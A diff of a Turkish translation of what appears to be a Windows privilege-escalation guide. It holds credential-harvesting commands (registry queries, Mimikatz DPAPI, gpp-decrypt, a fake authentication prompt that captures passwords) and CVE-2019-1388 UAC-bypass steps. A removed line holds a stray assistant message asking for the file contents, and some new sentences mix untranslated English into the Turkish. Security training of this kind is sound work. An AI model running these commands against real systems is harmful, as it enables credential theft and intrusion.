@@ -821,8 +851,8 @@ cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| 
 ```
 ### Kaydedilmiş RDP Bağlantıları
 
-Bunları `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
-ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\` konumlarında bulabilirsiniz.
+Bunları şu konumlarda bulabilirsiniz: `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
+ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\`
 
 ### Son Çalıştırılan Komutlar
 ```
@@ -833,20 +863,20 @@ HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 ```
 %localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
 ```
-**Mimikatz** `dpapi::rdg` modülünü uygun `/masterkey` ile kullanarak herhangi bir .rdg dosyasının **şifresini çözebilirsiniz`\
-Mimikatz `sekurlsa::dpapi` modülü ile bellekteki birçok DPAPI masterkey'i **çıkarabilirsiniz**
+Uygun `/masterkey` ile **Mimikatz** `dpapi::rdg` modülünü kullanarak **herhangi .rdg dosyalarını deşifre edebilirsiniz**\
+Mimikatz `sekurlsa::dpapi` modülü ile bellekten **birçok DPAPI masterkey** çıkarabilirsiniz
 
 ### Sticky Notes
 
-Kullanıcılar genellikle Windows iş istasyonlarında StickyNotes uygulamasını bir veritabanı dosyası olduğunu fark etmeden **parolaları ve diğer bilgileri kaydetmek** için kullanırlar. Bu dosya `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda bulunur ve her zaman aranıp incelenmeye değerdir.
+Kullanıcılar genellikle Windows iş istasyonlarındaki StickyNotes uygulamasını bunun bir veritabanı dosyası olduğunu fark etmeden **save passwords** ve diğer bilgileri saklamak için kullanır. Bu dosya `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda bulunur ve her zaman aranıp incelenmeye değerdir.
 
 ### AppCmd.exe
 
-**AppCmd.exe'den parolaları kurtarmak için Administrator olmanız ve High Integrity seviyesinde çalıştırmanız gerektiğini unutmayın.**\
+**Not: AppCmd.exe'den passwords kurtarmak için Administrator olmanız ve High Integrity seviyesinde çalıştırmanız gerekir.**\
 **AppCmd.exe** `%systemroot%\system32\inetsrv\` dizininde bulunur.\
-Bu dosya mevcutsa bazı **credentials** yapılandırılmış olabilir ve **kurtarılabilir**.
+Bu dosya mevcutsa bazı **credentials** yapılandırılmış olabilir ve kurtarılabilir.
 
-Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) kaynağından çıkarılmıştır:
+Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) projesinden alınmıştır:
 ```bash
 function Get-ApplicationHost {
 $OrigError = $ErrorActionPreference
@@ -926,14 +956,14 @@ $ErrorActionPreference = $OrigError
 ```
 ### SCClient / SCCM
 
-`C:\Windows\CCM\SCClient.exe` dosyasının var olup olmadığını kontrol edin .\
-Yükleyiciler **SYSTEM ayrıcalıklarıyla çalıştırılır**, birçoğu **DLL Sideloading'e açıktır (Bilgi kaynağı** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
+`C:\Windows\CCM\SCClient.exe` dosyasının varlığını kontrol edin.\
+Yükleyiciler **SYSTEM privileges** ile çalıştırılır; birçoğu **DLL Sideloading (Bilgi kaynağı: [https://github.com/enjoiz/Privesc](https://github.com/enjoiz/Privesc))**'e karşı savunmasızdır.
 ```bash
 $result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
 if ($result) { $result }
 else { Write "Not Installed." }
 ```
-## Dosyalar ve Kayıt Defteri (Credentials)
+## Dosyalar ve Kayıt Defteri (Kimlik Bilgileri)
 
 ### Putty Creds
 ```bash
@@ -943,23 +973,23 @@ reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_
 ```
 reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
 ```
-### SSH keys kayıt defterinde
+### Kayıt defterindeki SSH keys
 
-SSH private keys kayıt defteri anahtarı `HKCU\Software\OpenSSH\Agent\Keys` içinde saklanabilir, bu yüzden orada ilginç bir şey olup olmadığını kontrol etmelisiniz:
+SSH private keys, kayıt defteri anahtarı `HKCU\Software\OpenSSH\Agent\Keys` içinde saklanabilir; bu yüzden orada ilginç bir şey olup olmadığını kontrol etmelisiniz:
 ```bash
 reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
 ```
-Eğer o yol içinde herhangi bir giriş bulursanız muhtemelen kaydedilmiş bir SSH key'dir. Şifrelenmiş olarak saklanır fakat [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca deşifre edilebilir.\
-Bu teknikle ilgili daha fazla bilgi burada: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
+Eğer o yolun içinde herhangi bir kayıt bulursanız muhtemelen kaydedilmiş bir SSH key'idir. Şifrelenmiş olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca çözülebilir.\
+Bu teknik hakkında daha fazla bilgi: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
 
-Eğer `ssh-agent` servisi çalışmıyorsa ve önyüklemede otomatik olarak başlamasını istiyorsanız şunu çalıştırın:
+Eğer `ssh-agent` servisi çalışmıyorsa ve sistem açılışında otomatik başlamasını istiyorsanız şunu çalıştırın:
 ```bash
 Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
 ```
 > [!TIP]
-> Görünüşe göre bu teknik artık geçerli değil. Birkaç ssh keys oluşturmaya, onları `ssh-add` ile eklemeye ve ssh ile bir makineye giriş yapmaya çalıştım. Kayıt defteri HKCU\Software\OpenSSH\Agent\Keys bulunmuyor ve procmon, asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.
+> Bu teknik artık geçerli değil gibi görünüyor. Bazı ssh anahtarları oluşturmaya, bunları `ssh-add` ile eklemeye ve bir makineye ssh ile bağlanmaya çalıştım. HKCU\Software\OpenSSH\Agent\Keys kayıt defteri yok ve procmon, asimetrik anahtar doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.
 
-### Unattended files
+### Gözetimsiz dosyalar
 ```
 C:\Windows\sysprep\sysprep.xml
 C:\Windows\sysprep\sysprep.inf
@@ -974,9 +1004,7 @@ C:\unattend.txt
 C:\unattend.inf
 dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
 ```
-Bu dosyaları ayrıca **metasploit** kullanarak arayabilirsiniz: _post/windows/gather/enum_unattend_
-
-Örnek içerik:
+Bu dosyaları ayrıca **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_
 ```xml
 <component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
 <AutoLogon>
@@ -1017,15 +1045,15 @@ AppData\Roaming\gcloud\access_tokens.db
 ```
 ### McAfee SiteList.xml
 
-SiteList.xml adlı bir dosya arayın
+Adı **SiteList.xml** olan bir dosya arayın
 
 ### Önbelleğe Alınmış GPP Parolası
 
-Önceden, Group Policy Preferences (GPP) aracılığıyla bir grup makineye özel local administrator hesapları dağıtılmasına izin veren bir özellik mevcuttu. Ancak bu yöntemin önemli güvenlik zafiyetleri vardı. İlk olarak, SYSVOL içinde XML dosyaları olarak saklanan Group Policy Objects (GPOs), herhangi bir domain kullanıcısı tarafından erişilebilir durumdaydı. İkinci olarak, bu GPP'lerdeki parolalar, halka açık şekilde belgelenmiş varsayılan bir anahtar kullanılarak AES256 ile şifrelenmiş olsa da, herhangi bir kimliği doğrulanmış kullanıcı tarafından çözülebiliyordu. Bu, kullanıcıların yetki yükseltmesine yol açabileceği için ciddi bir risk oluşturuyordu.
+Daha önce, Group Policy Preferences (GPP) aracılığıyla bir grup makinede özel yerel yönetici hesaplarının dağıtılmasına izin veren bir özellik vardı. Ancak bu yöntemin önemli güvenlik açıkları vardı. Birincisi, SYSVOL'de XML dosyaları olarak depolanan Group Policy Objects (GPOs) herhangi bir domain kullanıcısı tarafından erişilebiliyordu. İkincisi, bu GPP'lerdeki parolalar, kamuya açık şekilde belgelenmiş varsayılan bir anahtar kullanılarak AES256 ile şifrelenmişti ve herhangi bir kimlikli kullanıcı tarafından deşifre edilebiliyordu. Bu, kullanıcıların yükseltilmiş ayrıcalıklar elde etmesine izin verebilecek ciddi bir risk oluşturuyordu.
 
-Bu riski azaltmak için, içinde boş olmayan bir "cpassword" alanı bulunan yerel önbelleğe alınmış GPP dosyalarını tarayan bir fonksiyon geliştirildi. Böyle bir dosya bulunduğunda fonksiyon parolayı çözer ve özel bir PowerShell objesi döndürür. Bu obje, GPP hakkında ve dosyanın konumu hakkında bilgiler içerir; bu da bu güvenlik açığının tespiti ve giderilmesine yardımcı olur.
+Bu riski azaltmak için, içinde "cpassword" alanı boş olmayan yerel önbelleğe alınmış GPP dosyalarını tarayan bir fonksiyon geliştirildi. Böyle bir dosya bulunduğunda fonksiyon parolayı deşifre eder ve özel bir PowerShell nesnesi döner. Bu nesne, GPP ile dosyanın konumu hakkında ayrıntılar içerir ve bu güvenlik açığının tespit edilip giderilmesine yardımcı olur.
 
-Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:
+Bu dosyaları bulmak için `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista'dan önce)_ klasörlerinde arayın:
 
 - Groups.xml
 - Services.xml
@@ -1034,7 +1062,7 @@ Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents 
 - Printers.xml
 - Drives.xml
 
-**cPassword'i çözmek için:**
+**cPassword'i deşifre etmek için:**
 ```bash
 #To decrypt these passwords you can decrypt it using
 gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
@@ -1087,7 +1115,7 @@ $entropy,
 Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
 }
 ```
-### Günlükler
+### Logs
 ```bash
 # IIS
 C:\inetpub\logs\LogFiles\*
@@ -1095,9 +1123,9 @@ C:\inetpub\logs\LogFiles\*
 #Apache
 Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
 ```
-### Kimlik bilgilerini isteyin
+### Credentials isteyin
 
-Eğer kullanıcının bunları bilebileceğini düşünüyorsanız, kullanıcıdan kendi **kimlik bilgilerini** veya hatta başka bir kullanıcının **kimlik bilgilerini** girmesini her zaman **isteyebilirsiniz** (unutmayın: müşteriden doğrudan **kimlik bilgilerini** **istemek** gerçekten **risklidir**):
+**Kullanıcıdan kendi credentials'ını veya farklı bir kullanıcının credentials'ını girmesini isteyebilirsiniz** eğer bunları bilebileceğini düşünüyorsanız (doğrudan istemciye **credentials**'ı **sormak** gerçekten **risklidir**):
 ```bash
 $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
 $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password
@@ -1105,9 +1133,9 @@ $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::U
 #Get plaintext
 $cred.GetNetworkCredential() | fl
 ```
-### **credentials içerebilecek olası dosya adları**
+### **Kimlik bilgilerini içerebilecek olası dosya adları**
 
-Bir süre önce **passwords**'ı **clear-text** veya **Base64** olarak içeren bilinen dosyalar
+Bir süre önce bazı dosyalarda **parolalar** **düz metin** veya **Base64** olarak bulunuyordu
 ```bash
 $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
 vnc.ini, ultravnc.ini, *vnc*
@@ -1171,7 +1199,7 @@ TypedURLs       #IE
 %USERPROFILE%\ntuser.dat
 %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
 ```
-src/windows-hardening/windows-local-privilege-escalation/README.md dosyasına erişimim yok. Lütfen dosya içeriğini yapıştırın veya aramamı istediğiniz dosyaların listesini verin.
+Önerilen tüm dosyaları ara:
 ```
 cd C:\
 dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
@@ -1180,15 +1208,15 @@ dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd
 ```
 Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
 ```
-### Geri Dönüşüm Kutusundaki Kimlik Bilgileri
+### Credentials in the RecycleBin
 
-Ayrıca kimlik bilgileri için Geri Dönüşüm Kutusunu da kontrol etmelisiniz
+Ayrıca Bin'i kontrol ederek içinde credentials olup olmadığına bakmalısınız
 
-Birçok program tarafından kaydedilen **parolaları kurtarmak** için şunu kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)
+Çeşitli programlar tarafından kaydedilmiş parolaları **kurtarmak** için şu adresi kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)
 
-### Kayıt Defterinde
+### Kayıt Defteri İçinde
 
-**Kimlik bilgileri içerebilecek diğer kayıt anahtarları**
+**Credentials içerebilecek diğer kayıt defteri anahtarları**
 ```bash
 reg query "HKCU\Software\ORL\WinVNC3\Password"
 reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
@@ -1199,10 +1227,10 @@ reg query "HKCU\Software\OpenSSH\Agent\Key"
 
 ### Tarayıcı Geçmişi
 
-Chrome veya Firefox şifrelerinin saklandığı veritabanlarını (dbs) kontrol etmelisiniz.\
-Ayrıca tarayıcıların geçmişini, yer imlerini ve favorilerini kontrol edin; bazı **parolalar** orada saklanıyor olabilir.
+Parolaların saklandığı **Chrome veya Firefox** db'lerini kontrol etmelisiniz.\
+Ayrıca tarayıcıların geçmişini, yer imlerini ve favorilerini kontrol edin; belki bazı **parolalar** orada saklıdır.
 
-Tools to extract passwords from browsers:
+Tarayıcılardan parola çıkarmak için araçlar:
 
 - Mimikatz: `dpapi::chrome`
 - [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
@@ -1211,26 +1239,26 @@ Tools to extract passwords from browsers:
 
 ### **COM DLL Overwriting**
 
-**Component Object Model (COM)**, Windows işletim sistemi içinde yerleşik bir teknolojidir ve farklı dillerde yazılmış yazılım bileşenleri arasında iletişime izin verir. Her COM bileşeni bir class ID (CLSID) ile tanımlanır ve her bileşen, interface ID'leri (IIDs) ile tanımlanan bir veya daha fazla arayüz aracılığıyla işlevsellik sunar.
+**Component Object Model (COM)**, farklı dillerde yazılmış yazılım bileşenleri arasında **intercommunication** sağlayan Windows içinde yerleşik bir teknolojidir. Her COM bileşeni **identified via a class ID (CLSID)** ile tanımlanır ve her bileşen bir veya daha fazla arayüz aracılığıyla işlevsellik sunar; bu arayüzler **identified via interface IDs (IIDs)** ile tanımlanır.
 
-COM sınıfları ve arayüzleri sırasıyla kayıt defterinde **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında tanımlanır. Bu kayıt, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** birleştirilerek **HKEY\CLASSES\ROOT** oluşturulmasıyla meydana gelir.
+COM sınıfları ve arayüzleri sırasıyla kayıt defterinde **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında tanımlanır. Bu kayıt, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** birleştirilerek oluşturulur: **HKEY\CLASSES\ROOT.**
 
-Bu kayıt içindeki CLSID'lerin altında **InProcServer32** adlı alt kayıt bulunur; burası bir **varsayılan değer** içerir ve bu değer bir **DLL**'e işaret eder. Ayrıca **ThreadingModel** adında bir değer bulunur; bu değer **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) veya **Neutral** (Thread Neutral) olabilir.
+Bu kayıt içindeki CLSID'lerin içinde, **default value** ile bir **DLL**'e işaret eden ve **ThreadingModel** adlı bir değere sahip **InProcServer32** alt kaydını bulabilirsiniz; ThreadingModel şu değerleri alabilir: **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) veya **Neutral** (Thread Neutral).
 
 ![](<../../images/image (729).png>)
 
-Temelde, yürütülecek **DLL'lerin** herhangi birini üzerine yazabilirseniz, o DLL farklı bir kullanıcı tarafından çalıştırılacaksa **yetki yükseltmesi** gerçekleştirebilirsiniz.
+Temelde, çalıştırılacak herhangi bir DLL'i **overwrite any of the DLLs** edebiliyorsanız, o DLL farklı bir kullanıcı tarafından çalıştırılacaksa **escalate privileges** elde edebilirsiniz.
 
-To learn how attackers use COM Hijacking as a persistence mechanism check:
+Saldırganların COM Hijacking'i kalıcılık mekanizması olarak nasıl kullandığını öğrenmek için bakın:
 
 
 {{#ref}}
 com-hijacking.md
 {{#endref}}
 
-### **Dosyalarda ve kayıt defterinde genel parola araması**
+### **Generic Password search in files and registry**
 
-**Dosya içeriğinde arama yapın**
+**Search for file contents**
 ```bash
 cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
 findstr /si password *.xml *.ini *.txt *.config
@@ -1242,7 +1270,7 @@ dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
 where /R C:\ user.txt
 where /R C:\ *.ini
 ```
-**Anahtar adları ve şifreler için registry'yi ara**
+**Anahtar adları ve parolalar için kayıt defterinde ara**
 ```bash
 REG QUERY HKLM /F "password" /t REG_SZ /S /K
 REG QUERY HKCU /F "password" /t REG_SZ /S /K
@@ -1251,11 +1279,11 @@ REG QUERY HKCU /F "password" /t REG_SZ /S /d
 ```
 ### Passwords arayan araçlar
 
-[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **bir msf** pluginidir. Bu eklentiyi, hedef içinde **credentials** arayan tüm **metasploit POST module**'lerini **otomatik olarak çalıştırmak** için oluşturdum.\
-[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada bahsedilen passwords içeren tüm dosyaları otomatik olarak arar.\
-[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden password çıkarmak için başka harika bir araçtır.
+[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **msf** için bir plugin'dir; bu plugin'i hedef içinde **credentials arayan tüm metasploit POST module'lerini otomatik olarak çalıştırmak** için oluşturdum.\
+[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada bahsedilen ve passwords içeren tüm dosyaları otomatik olarak arar.\
+[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden password çıkarmak için başka bir harika araçtır.
 
-The tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) aracı, bu verileri clear text olarak kaydeden çeşitli araçların **sessions**, **usernames** ve **passwords**'larını arar (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
+[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) aracı, verileri clear text olarak kaydeden (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP) birkaç aracın **sessions**, **usernames** ve **passwords**'larını arar.
 ```bash
 Import-Module path\to\SessionGopher.ps1;
 Invoke-SessionGopher -Thorough
@@ -1264,30 +1292,30 @@ Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 ```
 ## Leaked Handlers
 
-Düşünün ki **SYSTEM olarak çalışan bir process**, `OpenProcess()` ile **full access** sahip yeni bir process açıyor. Aynı process **`CreateProcess()` ile düşük ayrıcalıklı fakat ana processin tüm açık handle'larını devralan** bir process daha oluşturuyor.\
-Eğer düşük ayrıcalıklı process üzerinde **full access** hakkınız varsa, `OpenProcess()` ile oluşturulmuş ayrıcalıklı process'e ait **açık handle'ı** ele geçirip **shellcode enjekte edebilirsiniz**.\
-[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
-[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).
+Düşünün ki **SYSTEM olarak çalışan bir process yeni bir process açıyor** (`OpenProcess()`) ve **tam erişim** veriyor. Aynı process **ayrıca düşük ayrıcalıklı ama ana processin tüm açık handle'larını miras alan yeni bir process oluşturuyor** (`CreateProcess()`).\
+Sonra, eğer düşük ayrıcalıklı process'e **tam erişiminiz** varsa, `OpenProcess()` ile oluşturulmuş ayrıcalıklı process'e ait **açık handle'ı ele geçirebilir** ve **shellcode enjekte edebilirsiniz**.\
+[Bu açığın **nasıl tespit edilip ve suistimal edileceği** hakkında daha fazla bilgi için bu örneği okuyun.](leaked-handle-exploitation.md)\
+[Daha kapsamlı bir açıklama ve farklı izin seviyeleriyle (sadece tam erişim değil) miras kalan process ve thread'lerin açık handler'larını nasıl test edip kötüye kullanacağınızı öğrenmek için bu **diğer gönderiyi** okuyun.](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)
 
 ## Named Pipe Client Impersonation
 
-Paylaşılan bellek segmentleri, **pipes** olarak adlandırılır ve processler arası iletişim ile veri aktarımını sağlar.
+Ortak bellek segmentleri, **pipes** olarak adlandırılan, süreçler arası iletişim ve veri aktarımını sağlar.
 
-Windows, ilişkisiz processlerin bile veri paylaşmasına olanak veren **Named Pipes** adlı bir özellik sağlar; hatta farklı ağlar üzerinden bile. Bu, **named pipe server** ve **named pipe client** rollerinin tanımlandığı bir client/server mimarisine benzer.
+Windows, ilgisiz süreçlerin bile veri paylaşmasına izin veren **Named Pipes** adlı bir özellik sunar; bu farklı ağlar üzerinden bile olabilir. Bu, **named pipe server** ve **named pipe client** rollerinin tanımlandığı bir client/server mimarisine benzer.
 
-Bir **client** tarafından pipe üzerinden veri gönderildiğinde, pipe'ı kuran **server**, gerekli **SeImpersonate** haklarına sahipse **client'ın kimliğini üstlenme** yeteneğine sahiptir. Pipe üzerinden iletişim kuran ve taklit edebileceğiniz bir **ayrıcalıklı process** tespit etmek; sizin oluşturduğunuz pipe ile etkileşime girdiğinde onun kimliğini üstlenerek **daha yüksek ayrıcalıklar elde etme** şansı verir. Böyle bir saldırının nasıl gerçekleştirileceğine dair yönergeler için [**buraya**](named-pipe-client-impersonation.md) ve [**buraya**](#from-high-integrity-to-system) bakın.
+Bir **client** tarafından bir pipe üzerinden veri gönderildiğinde, pipe'ı kuran **server**, gerekli **SeImpersonate** haklarına sahipse **client'ın kimliğini üstlenebilir**. Taklit edebileceğiniz bir pipe üzerinden iletişim kuran bir **ayrıcalıklı process** tespit etmek, sizin oluşturduğunuz pipe ile etkileşime girdiklerinde o process'in kimliğini üstlenerek **daha yüksek ayrıcalıklar elde etme** imkânı sunar. Böyle bir saldırının nasıl gerçekleştirileceğine dair talimatlar için yararlı kılavuzlar [**burada**](named-pipe-client-impersonation.md) ve [**burada**](#from-high-integrity-to-system) bulunabilir.
 
-Ayrıca aşağıdaki araç, burp gibi bir araçla **named pipe iletişimini intercept etmeye** olanak tanır: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) ve bu araç tüm pipe'ları listeleyip görüntüleyerek privesc'leri bulmanıza yardımcı olur: [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
+Ayrıca aşağıdaki araç, **burp gibi bir araçla named pipe iletişimini intercept etmeye** olanak tanır: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu araç tüm pipe'ları listeleyip inceleyerek privesc'leri bulmayı sağlar:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
 
-## Diğer
+## Misc
 
-### File Extensions that could execute stuff in Windows
+### Windows'ta kod çalıştırabilecek dosya uzantıları
 
-Sayfaya göz atın: [https://filesec.io/](https://filesec.io/)
+Şu sayfaya bakın **[https://filesec.io/](https://filesec.io/)**
 
-### **Komut Satırlarını Parolalar İçin İzleme**
+### **Parolalar için Komut Satırlarını İzleme**
 
-Bir kullanıcı olarak shell elde ettiğinizde, zamanlanmış görevler veya diğer processlerin çalıştırılıyor olması ve kimlik bilgilerini komut satırında geçiriyor olmaları mümkündür. Aşağıdaki script, process komut satırlarını her iki saniyede bir yakalar ve mevcut durumu önceki durumla karşılaştırarak herhangi bir farkı çıktı olarak verir.
+Bir kullanıcı olarak shell elde ettiğinizde, komut satırında kimlik bilgilerini **geçen** zamanlanmış görevler veya başka süreçler çalışıyor olabilir. Aşağıdaki script, süreç komut satırlarını her iki saniyede bir yakalar ve mevcut durumu önceki durumla karşılaştırarak herhangi bir farkı çıktılar.
 ```bash
 while($true)
 {
@@ -1297,13 +1325,13 @@ $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
 Compare-Object -ReferenceObject $process -DifferenceObject $process2
 }
 ```
-## Proseslerden parolaları çalma
+## İşlemlerden şifre çalma
 
-## Düşük Yetkili Kullanıcıdan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Bypass
+## Düşük ayrıcalıklı kullanıcıdan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Bypass
 
-Eğer grafik arayüze (konsol veya RDP üzerinden) erişiminiz varsa ve UAC etkinse, bazı Microsoft Windows sürümlerinde yetkisiz bir kullanıcıdan terminal veya "NT\AUTHORITY SYSTEM" gibi başka bir süreci çalıştırmak mümkündür.
+Grafik arayüze (konsol veya RDP aracılığıyla) erişiminiz varsa ve UAC etkinse, bazı Microsoft Windows sürümlerinde ayrıcalıksız bir kullanıcıdan "NT\AUTHORITY SYSTEM" gibi bir terminal ya da başka herhangi bir işlem çalıştırmak mümkündür.
 
-Bu, ayrıcalıkları yükseltmeyi ve aynı zamanda aynı zafiyetle UAC'yi atlamayı mümkün kılar. Ayrıca, herhangi bir şey kurmaya gerek yoktur ve süreç sırasında kullanılan binary, Microsoft tarafından imzalanmış ve yayımlanmıştır.
+Bu, aynı güvenlik açığı ile aynı anda ayrıcalık yükseltmeyi ve UAC bypass'ını mümkün kılar. Ayrıca herhangi bir şey yüklemeye gerek yoktur ve süreç sırasında kullanılan binary, Microsoft tarafından imzalanmış ve yayımlanmıştır.
 
 Etkilenen bazı sistemler şunlardır:
 ```
@@ -1327,7 +1355,7 @@ Windows 10 1607	14393	** link OPENED AS SYSTEM **
 Windows 10 1703	15063	link NOT opened
 Windows 10 1709	16299	link NOT opened
 ```
-Bu zafiyetten yararlanmak için aşağıdaki adımların gerçekleştirilmesi gerekir:
+Bu güvenlik açığından yararlanmak için aşağıdaki adımların gerçekleştirilmesi gerekir:
 ```
 1) Right click on the HHUPD.EXE file and run it as Administrator.
 
@@ -1367,146 +1395,146 @@ Then **read this to learn about UAC and UAC bypasses:**
 
 ## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP
 
-The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).
+The technique described [**bu blog yazısında**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**burada**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).
 
-The attack basically consist of abusing the Windows Installer's rollback feature to replace legitimate files with malicious ones during the uninstallation process. For this the attacker needs to create a **malicious MSI installer** that will be used to hijack the `C:\Config.Msi` folder, which will later be used by he Windows Installer to store rollback files during the uninstallation of other MSI packages where the rollback files would have been modified to contain the malicious payload.
